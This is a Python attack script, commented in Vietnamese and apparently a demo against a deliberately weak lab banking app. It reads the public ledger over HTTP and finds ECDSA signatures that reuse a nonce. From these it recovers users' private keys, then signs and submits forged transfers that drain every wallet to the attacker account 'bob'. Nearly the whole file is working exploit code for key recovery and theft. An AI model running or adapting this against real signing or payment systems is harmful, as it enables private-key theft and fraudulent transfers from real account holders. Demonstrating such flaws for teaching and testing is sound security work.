"""TẤN CÔNG 1 — NONCE REUSE (qua HTTP, dùng API công khai thật).

Ví mỗi người dùng có RNG hỏng nên nhiều giao dịch của họ lặp lại nonce. Từ SỔ CÁI
công khai (/api/transactions), kẻ tấn công phát hiện các chữ ký cùng r của cùng một
người gửi → khôi phục KHÓA RIÊNG của người đó → tự ký giao dịch rút sạch tiền của họ
về 'bob' và nộp qua /api/tx/submit (đúng endpoint mà form chuyển tiền dùng).

    python attack_nonce_reuse.py
"""
import time

from common import (banner, step, info, ok, bad, impact, money,
                    get, post, tx_bytes, hash_to_int, inverse_mod,
                    sign_transfer, curve_from_info)

ATTACKER = "bob"


def recover_key(n, t1, t2):
    r = int(t1["r"]); s1 = int(t1["s"]); s2 = int(t2["s"])
    z1 = hash_to_int(tx_bytes(t1), n); z2 = hash_to_int(tx_bytes(t2), n)
    if (s1 - s2) % n == 0:
        return None
    k = (z1 - z2) * inverse_mod((s1 - s2) % n, n) % n
    return (s1 * k - z1) * inverse_mod(r, n) % n


def main():
    banner("TẤN CÔNG 1 — NONCE REUSE  →  khôi phục khóa mọi ví, rút sạch ngân hàng")

    step(1, "Thu thập sổ cái công khai (GET /api/transactions) & số dư (GET /api/state)")
    _, txs = get("/api/transactions")
    _, state = get("/api/state")
    _, accounts = get("/api/accounts")
    balance = {a["user"]: a["balance"] for a in state["accounts"]}
    pub = {a["user"]: (int(a["pub"]["x"]), int(a["pub"]["y"])) for a in accounts}
    # Mỗi tài khoản có thể dùng đường cong khác nhau → dựng lại đúng đường cong của họ.
    curves = {a["user"]: curve_from_info(a["curve"]) for a in accounts}
    info("Số chữ ký thu được", len(txs))

    step(2, "Nhóm chữ ký theo người gửi, tìm nonce trùng (cùng r) & khôi phục khóa")
    by_sender = {}
    for t in txs:
        by_sender.setdefault(t["from"], []).append(t)
    keys = {}
    for u, lst in by_sender.items():
        if u == ATTACKER:
            continue
        cu = curves[u]
        seen = {}
        for t in lst:
            if t["r"] in seen:
                d = recover_key(cu.n, seen[t["r"]], t)
                if d and cu.mul(d, cu.G) == cu.point(*pub[u]):
                    keys[u] = (d, cu)
                break
            seen[t["r"]] = t
    ok(f"Khôi phục được khóa riêng của {len(keys)} ví (đối chiếu d·G == khóa công khai)")

    step(3, "Ký giao dịch giả rút sạch từng ví về 'bob' (POST /api/tx/submit)")
    stolen = 0
    nid = state["next_id"]                     # số thứ tự giao dịch hiện tại (đồng bộ với server)
    for u, (d, cu) in keys.items():
        amt = balance.get(u, 0)
        if amt <= 0:
            continue
        tx, r, s = sign_transfer(cu, d, u, ATTACKER, amt, nid)
        stt, res = post("/api/tx/submit", {**tx, "r": str(r), "s": str(s)})
        if isinstance(res, dict) and res.get("ok"):
            stolen += amt
            nid += 1
            ok(f"Rút {money(amt):>12} CBC từ {u} ({cu.name})")
        else:
            bad(f"{u}: {res.get('message') if isinstance(res, dict) else res}")
        time.sleep(0.2)

    impact(f"Đã chuyển {money(stolen)} CBC về '{ATTACKER}' từ {len(keys)} ví bị lộ khóa")


if __name__ == "__main__":
    main()
